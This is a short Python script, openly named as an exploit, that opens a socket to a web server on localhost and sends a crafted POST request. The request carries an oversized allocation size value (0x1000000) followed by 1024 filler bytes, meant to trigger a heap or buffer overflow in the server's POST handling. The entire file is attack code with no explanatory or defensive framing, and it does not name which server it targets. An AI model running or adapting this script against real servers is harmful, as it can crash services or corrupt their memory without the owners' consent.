#!/usr/bin/env python3
import socket
import struct
import sys

def exploit_post_overflow():
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 80))
    
    # Craft malicious POST request
    # First 4 bytes: "POST"
    # Next 4 bytes: size value for allocation
    size_value = 0x1000000  # Large value to cause overflow
    size_bytes = struct.pack('<I', size_value)
    
    # Construct POST request with malicious size
    request = b'POST / HTTP/1.1\r\n'
    request += b'Host: localhost\r\n'
    request += b'Content-Type: application/octet-stream\r\n'
    request += b'Content-Length: ' + str(len(size_bytes) + 1024).encode() + b'\r\n'
    request += b'\r\n'
    request += size_bytes  # Size value for allocation
    request += b'A' * 1024  # Payload data
    
    # Send the request
    print("[*] Sending malicious POST request...")
    s.send(request)
    
    # Receive response
    response = s.recv(1024)
    print("[*] Response received:", response)
    
    s.close()

if __name__ == "__main__":
    exploit_post_overflow() 